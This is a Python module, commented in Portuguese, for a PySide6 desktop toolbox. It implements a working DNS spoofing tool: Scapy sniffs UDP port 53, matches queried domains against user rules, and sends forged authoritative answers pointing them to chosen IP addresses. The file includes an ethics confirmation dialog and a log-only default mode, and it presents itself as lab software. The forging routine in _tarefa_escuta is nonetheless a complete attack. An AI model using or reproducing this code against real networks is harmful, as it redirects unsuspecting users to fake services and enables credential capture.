"""Ferramenta: Simulador de DNS Spoofing para laboratório.

Escuta consultas DNS (UDP 53), compara com regras de domínio configuradas na
interface e devolve uma resposta forjada usando o Scapy. O modo "somente
registro" observa as consultas sem responder, útil para validar as regras antes
de qualquer envio.

A thread de escuta nunca toca em widgets: cada consulta é entregue por sinal Qt.
"""
from __future__ import annotations

import ipaddress
import threading
import time
from typing import Any, Dict, List, Optional

from PySide6.QtCore import QObject, QTimer, Signal
from PySide6.QtWidgets import (
    QAbstractItemView,
    QCheckBox,
    QComboBox,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QPushButton,
    QTableWidgetItem,
    QWidget,
)

from wintoolbox.core.registry import Tool, register
from wintoolbox.tools._helpers import (
    DependenciaAusente,
    aviso_dependencia,
    confirmar_termo_etico,
    dependencia_disponivel,
    formatar_numero,
)
from wintoolbox.tools._widgets import (
    PainelFerramenta,
    adicionar_log_painel,
    botao_copiar,
    criar_aviso,
    criar_card,
    criar_saida_texto,
    criar_tabela,
    executar_assincrono,
    mostrar_erro,
    preencher_tabela,
)

TEXTO_ETICO = (
    "O DNS Spoofing responde consultas de nomes com endereços escolhidos por "
    "você. Usuários da rede podem ser levados a serviços falsos, ter credenciais "
    "capturadas e perder acesso a sites legítimos.\n\n"
    "Use esta ferramenta somente em laboratório isolado ou em rede própria, com "
    "autorização expressa e por escrito do responsável, informando quais domínios "
    "e clientes serão afetados.\n\n"
    "A interceptação e a fraude não autorizadas são crime previsto na Lei "
    "12.737/2012 (art. 154-A do Código Penal) e podem violar a Lei 13.709/2018 "
    "(LGPD).\n\n"
    "Você declara possuir autorização por escrito e assume integral "
    "responsabilidade pelas respostas forjadas?"
)

MAX_LINHAS = 2000
INTERVALO_LOOP = 0.2


class _SinaisDns(QObject):
    """Sinais emitidos pela thread de escuta DNS."""

    consulta = Signal(object)


def _listar_interfaces() -> List[tuple[str, str]]:
    """Lista interfaces do Scapy como pares (rótulo, nome)."""
    try:
        from scapy.all import conf

        pares: List[tuple[str, str]] = []
        vistos: set[str] = set()
        for interface in conf.ifaces.values():
            nome = getattr(interface, "name", "") or ""
            if not nome or nome in vistos:
                continue
            vistos.add(nome)
            descricao = getattr(interface, "description", "") or nome
            endereco = getattr(interface, "ip", "") or ""
            pares.append((f"{descricao} ({endereco})" if endereco else descricao, nome))
        return pares
    except Exception:
        return []


def _casamento_regra(regras: Dict[str, str], nome: str) -> Optional[str]:
    """Retorna o IP da primeira regra compatível com o domínio consultado."""
    alvo = str(nome or "").strip().lower().rstrip(".")
    if not alvo:
        return None
    if alvo in regras:
        return regras[alvo]
    for padrao, endereco in regras.items():
        if padrao.startswith("*."):
            sufixo = padrao[2:]
            if alvo == sufixo or alvo.endswith("." + sufixo):
                return endereco
    return None


def _tarefa_escuta(
    interface: str,
    regras: Dict[str, str],
    somente_registro: bool,
    sinais: _SinaisDns,
    parar: threading.Event,
    ctx: Any,
) -> Dict[str, int]:
    """Escuta UDP 53 e forja respostas para os domínios mapeados."""
    from scapy.all import AsyncSniffer, DNS, DNSRR, IP, UDP, send

    contadores = {"consultas": 0, "casadas": 0, "forjadas": 0}

    def processar(pacote) -> None:
        if parar.is_set():
            return
        try:
            if not pacote.haslayer(DNS) or not pacote.haslayer(IP):
                return
            dns = pacote[DNS]
            if int(dns.qr) != 0 or dns.qd is None:
                return
            cliente = str(pacote[IP].src)
            nome = str(dns.qd.qname).rstrip(".").lower()
            tipo = int(dns.qd.qtype)
            endereco = _casamento_regra(regras, nome)
            contadores["consultas"] += 1

            acao = "Sem regra"
            if endereco is None:
                acao = "Sem regra"
            elif tipo != 1:
                acao = f"Regra casada, tipo {tipo} não respondido"
            elif somente_registro:
                contadores["casadas"] += 1
                acao = "Regra casada (somente registro)"
            else:
                contadores["casadas"] += 1
                resposta = (
                    IP(src=pacote[IP].dst, dst=pacote[IP].src)
                    / UDP(sport=53, dport=int(pacote[UDP].sport))
                    / DNS(
                        id=int(dns.id),
                        qr=1,
                        aa=1,
                        rd=int(dns.rd),
                        ra=1,
                        qd=dns.qd,
                        an=DNSRR(rrname=dns.qd.qname, ttl=60, rdata=endereco),
                    )
                )
                send(resposta, verbose=0)
                contadores["forjadas"] += 1
                acao = f"Resposta forjada para {endereco}"

            sinais.consulta.emit(
                {
                    "hora": time.strftime("%H:%M:%S"),
                    "cliente": cliente,
                    "dominio": nome,
                    "tipo": tipo,
                    "acao": acao,
                    "contadores": dict(contadores),
                }
            )
        except Exception as exc:  # uma consulta malformada não derruba a escuta
            ctx.log("AVISO", f"Consulta DNS ignorada por erro de leitura: {exc}")

    sniffer = AsyncSniffer(
        iface=interface or None,
        filter="udp port 53",
        prn=processar,
        store=False,
    )
    sniffer.start()
    time.sleep(0.4)
    falha = getattr(sniffer, "exception", None)
    if falha:
        try:
            sniffer.stop()
        except Exception:
            pass
        raise RuntimeError(f"Não foi possível iniciar a escuta DNS: {falha}")
    try:
        while not parar.is_set() and not ctx.cancelled():
            time.sleep(INTERVALO_LOOP)
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass
    return contadores


@register
class DnsSpoofTool(Tool):
    """Ferramenta de simulação de respostas DNS forjadas."""

    id = "network.dns_spoof"
    name = "Simulador de DNS Spoofing"
    category = "Rede e Internet"
    description = (
        "Escuta consultas DNS, aplica regras de domínio e devolve respostas "
        "forjadas com modo somente registro, tabela ao vivo e contadores"
    )
    keywords = [
        "dns",
        "spoofing",
        "forjado",
        "resposta",
        "udp",
        "53",
        "laboratório",
        "regras",
    ]
    requires_admin = False
    optional_deps = ["scapy"]

    def build_view(self, parent: Optional[QWidget] = None) -> QWidget:
        return DnsSpoofView(self, parent)


class DnsSpoofView(PainelFerramenta):
    """Página interativa do simulador de DNS Spoofing."""

    def __init__(self, tool: DnsSpoofTool, parent: Optional[QWidget] = None) -> None:
        super().__init__(tool, parent)
        self.sinais = _SinaisDns(self)
        self._parar = threading.Event()
        self._executando = False
        self._linhas: List[List[str]] = []
        self._contadores = {"consultas": 0, "casadas": 0, "forjadas": 0}
        self._montar_interface()
        self.sinais.consulta.connect(self._consulta_recebida)
        if dependencia_disponivel("scapy"):
            QTimer.singleShot(0, self._atualizar_interfaces)

    # ------------------------------------------------------------------ UI
    def _montar_interface(self) -> None:
        self.adicionar(
            criar_aviso(
                "Use o modo somente registro para validar as regras antes de "
                "responder. Respostas forjadas alteram a resolução de nomes de "
                "qualquer cliente da rede que consulte o servidor DNS interceptado.",
                self,
                destaque=True,
            )
        )

        cartao_regras, layout_regras = criar_card("Regras de resposta", self)
        self.adicionar(cartao_regras)
        self.tabela_regras = criar_tabela(["Domínio", "IP de resposta"], self)
        self.tabela_regras.setEditTriggers(
            QAbstractItemView.EditTrigger.DoubleClicked
            | QAbstractItemView.EditTrigger.EditKeyPressed
            | QAbstractItemView.EditTrigger.AnyKeyPressed
        )
        cabecalho_regras = self.tabela_regras.horizontalHeader()
        cabecalho_regras.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        cabecalho_regras.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        self.tabela_regras.setMinimumHeight(140)
        layout_regras.addWidget(self.tabela_regras)
        self._inserir_regra("exemplo.local", "127.0.0.1")

        linha_regras = QHBoxLayout()
        self.btn_adicionar = QPushButton("Adicionar regra")
        self.btn_adicionar.clicked.connect(lambda: self._inserir_regra("", ""))
        linha_regras.addWidget(self.btn_adicionar)
        self.btn_remover = QPushButton("Remover selecionada")
        self.btn_remover.clicked.connect(self._remover_regra)
        linha_regras.addWidget(self.btn_remover)
        linha_regras.addStretch()
        layout_regras.addLayout(linha_regras)
        dica = QLabel(
            "Use *.dominio.com para casar subdomínios. As regras são lidas no "
            "momento em que a escuta começa."
        )
        dica.setProperty("class", "secondary")
        dica.setWordWrap(True)
        layout_regras.addWidget(dica)

        cartao_escuta, layout_escuta = self.adicionar_card("Escuta DNS")
        linha_interface = QHBoxLayout()
        linha_interface.addWidget(QLabel("Interface:"))
        self.cmb_interface = QComboBox()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        self.cmb_interface.setMinimumWidth(230)
        linha_interface.addWidget(self.cmb_interface, stretch=1)
        self.btn_atualizar = QPushButton("Atualizar interfaces")
        self.btn_atualizar.clicked.connect(self._atualizar_interfaces)
        linha_interface.addWidget(self.btn_atualizar)
        layout_escuta.addLayout(linha_interface)

        linha_opcoes = QHBoxLayout()
        self.chk_somente_registro = QCheckBox("Modo somente registro (não responder)")
        self.chk_somente_registro.setChecked(True)
        linha_opcoes.addWidget(self.chk_somente_registro)

        self.btn_iniciar = QPushButton("Iniciar escuta")
        self.btn_iniciar.setProperty("class", "primary")
        self.btn_iniciar.clicked.connect(self._iniciar)
        linha_opcoes.addWidget(self.btn_iniciar)

        self.btn_parar = QPushButton("Parar escuta")
        self.btn_parar.setEnabled(False)
        self.btn_parar.clicked.connect(self._parar_escuta)
        linha_opcoes.addWidget(self.btn_parar)
        linha_opcoes.addStretch()
        layout_escuta.addLayout(linha_opcoes)

        self.lbl_status = QLabel("Pronto. Revise as regras e inicie a escuta.")
        self.lbl_status.setProperty("class", "secondary")
        self.lbl_status.setWordWrap(True)
        layout_escuta.addWidget(self.lbl_status)

        grade_contadores = QHBoxLayout()
        self.lbl_consultas = QLabel("Consultas: 0")
        self.lbl_casadas = QLabel("Regras casadas: 0")
        self.lbl_forjadas = QLabel("Respostas forjadas: 0")
        for etiqueta in (self.lbl_consultas, self.lbl_casadas, self.lbl_forjadas):
            etiqueta.setProperty("class", "secondary")
            grade_contadores.addWidget(etiqueta)
        grade_contadores.addStretch()
        layout_escuta.addLayout(grade_contadores)

        cartao_tabela, layout_tabela = self.adicionar_card("Consultas observadas")
        self.tabela = criar_tabela(
            ["Hora", "Cliente", "Domínio", "Tipo", "Ação"], self
        )
        cabecalho = self.tabela.horizontalHeader()
        for coluna in (0, 1, 3):
            cabecalho.setSectionResizeMode(coluna, QHeaderView.ResizeMode.ResizeToContents)
        cabecalho.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        cabecalho.setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)
        self.tabela.setMinimumHeight(220)
        layout_tabela.addWidget(self.tabela)

        linha_tabela = QHBoxLayout()
        self.btn_limpar = QPushButton("Limpar consultas")
        self.btn_limpar.clicked.connect(self._limpar_consultas)
        linha_tabela.addWidget(self.btn_limpar)
        linha_tabela.addStretch()
        layout_tabela.addLayout(linha_tabela)

        cartao_relatorio, layout_relatorio = self.adicionar_card("Relatório da escuta")
        self.txt_relatorio = criar_saida_texto(140, self)
        layout_relatorio.addWidget(self.txt_relatorio)
        linha_relatorio = QHBoxLayout()
        linha_relatorio.addWidget(
            botao_copiar(lambda: self.txt_relatorio.toPlainText(), self, "Copiar relatório")
        )
        linha_relatorio.addStretch()
        layout_relatorio.addLayout(linha_relatorio)

        self.log_panel = adicionar_log_painel(self, "Log da escuta DNS")
        self._definir_ocupado(False)

    def _atualizar_interfaces(self) -> None:
        if not dependencia_disponivel("scapy"):
            self.log_panel.append_log(
                "AVISO",
                "Scapy não está instalado: apenas a interface automática está disponível.",
            )
            return
        atual = self.cmb_interface.currentData()
        pares = _listar_interfaces()
        self.cmb_interface.blockSignals(True)
        self.cmb_interface.clear()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        for rotulo, nome in pares:
            self.cmb_interface.addItem(rotulo, nome)
        indice = self.cmb_interface.findData(atual) if atual else 0
        self.cmb_interface.setCurrentIndex(max(0, indice))
        self.cmb_interface.blockSignals(False)

    def _definir_ocupado(self, ocupado: bool) -> None:
        self._executando = ocupado
        self.btn_iniciar.setEnabled(not ocupado)
        self.btn_parar.setEnabled(ocupado)
        self.btn_atualizar.setEnabled(not ocupado)
        self.btn_adicionar.setEnabled(not ocupado)
        self.btn_remover.setEnabled(not ocupado)
        self.btn_limpar.setEnabled(not ocupado)
        self.tabela_regras.setEnabled(not ocupado)
        self.cmb_interface.setEnabled(not ocupado)
        self.chk_somente_registro.setEnabled(not ocupado)

    def _verificar_scapy(self) -> bool:
        if dependencia_disponivel("scapy"):
            return True
        aviso_dependencia(self, DependenciaAusente("Scapy", "scapy.all", "scapy"))
        return False

    # ------------------------------------------------------------- regras
    def _inserir_regra(self, dominio: str, endereco: str) -> None:
        linha = self.tabela_regras.rowCount()
        self.tabela_regras.insertRow(linha)
        self.tabela_regras.setItem(linha, 0, QTableWidgetItem(dominio))
        self.tabela_regras.setItem(linha, 1, QTableWidgetItem(endereco))

    def _remover_regra(self) -> None:
        linha = self.tabela_regras.currentRow()
        if linha < 0:
            self.lbl_status.setText("Selecione uma regra para remover.")
            return
        self.tabela_regras.removeRow(linha)

    def _coletar_regras(self) -> Dict[str, str]:
        """Lê e valida as regras na thread principal, antes da escuta."""
        regras: Dict[str, str] = {}
        for linha in range(self.tabela_regras.rowCount()):
            item_dominio = self.tabela_regras.item(linha, 0)
            item_ip = self.tabela_regras.item(linha, 1)
            bruto = (item_dominio.text() if item_dominio else "").strip().lower()
            endereco = (item_ip.text() if item_ip else "").strip()
            if not bruto and not endereco:
                continue
            if not bruto:
                raise ValueError(f"A linha {linha + 1} tem IP de resposta sem domínio.")
            if not endereco:
                raise ValueError(f"Informe o IP de resposta para o domínio '{bruto}'.")
            try:
                ipaddress.IPv4Address(endereco)
            except ValueError as exc:
                raise ValueError(
                    f"IP de resposta inválido para '{bruto}': {endereco}"
                ) from exc
            curinga = bruto.startswith("*.")
            dominio = bruto[2:] if curinga else bruto
            dominio = dominio.lstrip(".").rstrip(".")
            if not dominio:
                raise ValueError(f"Domínio inválido na linha {linha + 1}.")
            chave = f"*.{dominio}" if curinga else dominio
            regras[chave] = endereco
        if not regras:
            raise ValueError("Cadastre ao menos uma regra de domínio antes de iniciar.")
        return regras

    # -------------------------------------------------------------- escuta
    def _iniciar(self) -> None:
        if self._executando:
            return
        try:
            regras = self._coletar_regras()
        except ValueError as exc:
            mostrar_erro(self, "Regras inválidas", exc)
            return
        if not confirmar_termo_etico(self, self.tool.id, TEXTO_ETICO):
            return
        if not self._verificar_scapy():
            return

        interface = self.cmb_interface.currentData() or ""
        somente_registro = self.chk_somente_registro.isChecked()
        self._parar.clear()
        self._definir_ocupado(True)
        self.lbl_status.setText(
            "Escutando UDP 53 em modo "
            + ("somente registro." if somente_registro else "resposta forjada.")
        )
        self.log_panel.append_log(
            "INFO",
            f"Escuta DNS iniciada com {len(regras)} regra(s), modo "
            + ("somente registro." if somente_registro else "resposta forjada."),
        )

        def tarefa(ctx) -> Dict[str, int]:
            return _tarefa_escuta(
                interface, regras, somente_registro, self.sinais, self._parar, ctx
            )

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._escuta_encerrada,
            ao_falhar=self._falhou,
            ao_logar=self.log_panel.append_log,
        )

    def _parar_escuta(self) -> None:
        if not self._executando:
            return
        self._parar.set()
        self.runner.cancel_current()
        self.btn_parar.setEnabled(False)
        self.lbl_status.setText("Encerrando a escuta DNS...")

    def _consulta_recebida(self, dados: Dict[str, Any]) -> None:
        contadores = dados.get("contadores") or {}
        self._contadores.update(
            {
                "consultas": int(contadores.get("consultas", self._contadores["consultas"])),
                "casadas": int(contadores.get("casadas", self._contadores["casadas"])),
                "forjadas": int(contadores.get("forjadas", self._contadores["forjadas"])),
            }
        )
        self.lbl_consultas.setText(
            f"Consultas: {formatar_numero(self._contadores['consultas'])}"
        )
        self.lbl_casadas.setText(
            f"Regras casadas: {formatar_numero(self._contadores['casadas'])}"
        )
        self.lbl_forjadas.setText(
            f"Respostas forjadas: {formatar_numero(self._contadores['forjadas'])}"
        )

        linha = [
            str(dados.get("hora", "")),
            str(dados.get("cliente", "")),
            str(dados.get("dominio", "")),
            str(dados.get("tipo", "")),
            str(dados.get("acao", "")),
        ]
        self._linhas.append(linha)
        tabela = self.tabela
        if tabela.rowCount() >= MAX_LINHAS:
            tabela.removeRow(0)
        indice = tabela.rowCount()
        tabela.insertRow(indice)
        for coluna, valor in enumerate(linha):
            tabela.setItem(indice, coluna, QTableWidgetItem(valor))

    def _escuta_encerrada(self, resultado: Dict[str, int]) -> None:
        self._definir_ocupado(False)
        self.lbl_status.setText(
            "Escuta encerrada. "
            f"Consultas: {formatar_numero(self._contadores['consultas'])}, "
            f"respostas forjadas: {formatar_numero(self._contadores['forjadas'])}."
        )
        self.txt_relatorio.setPlainText(self._gerar_relatorio())
        self.log_panel.append_log("INFO", "Escuta DNS encerrada.")

    def _gerar_relatorio(self) -> str:
        linhas = [
            "Relatório de DNS Spoofing",
            f"Gerado em: {time.strftime('%d/%m/%Y %H:%M:%S')}",
            f"Interface: {self.cmb_interface.currentData() or 'automática'}",
            "Modo: " + ("somente registro" if self.chk_somente_registro.isChecked() else "resposta forjada"),
            f"Consultas observadas: {formatar_numero(self._contadores['consultas'])}",
            f"Regras casadas: {formatar_numero(self._contadores['casadas'])}",
            f"Respostas forjadas: {formatar_numero(self._contadores['forjadas'])}",
            "",
            "Regras em uso:",
        ]
        for linha in range(self.tabela_regras.rowCount()):
            dominio = self.tabela_regras.item(linha, 0)
            endereco = self.tabela_regras.item(linha, 1)
            if dominio and dominio.text().strip():
                linhas.append(
                    f"  {dominio.text().strip()} -> "
                    f"{endereco.text().strip() if endereco else '(sem IP)'}"
                )
        return "\n".join(linhas)

    def _limpar_consultas(self) -> None:
        if self._executando:
            return
        self._linhas.clear()
        preencher_tabela(self.tabela, [])
        self._contadores = {"consultas": 0, "casadas": 0, "forjadas": 0}
        self.lbl_consultas.setText("Consultas: 0")
        self.lbl_casadas.setText("Regras casadas: 0")
        self.lbl_forjadas.setText("Respostas forjadas: 0")
        self.txt_relatorio.clear()
        self.lbl_status.setText("Consultas e contadores limpos.")

    def _falhou(self, erro: Exception) -> None:
        self._definir_ocupado(False)
        self.lbl_status.setText("A escuta não foi concluída.")
        texto = str(erro)
        self.log_panel.append_log("ERRO", texto)
        if "Esta ferramenta requer" in texto:
            aviso_dependencia(self, erro)
        else:
            mostrar_erro(self, "Falha na escuta DNS", texto)

    def hideEvent(self, evento) -> None:  # noqa: N802 (assinatura Qt)
        """Sair da página encerra a escuta para não deixar o adaptador aberto."""
        if self._executando:
            self._parar_escuta()
        super().hideEvent(evento)
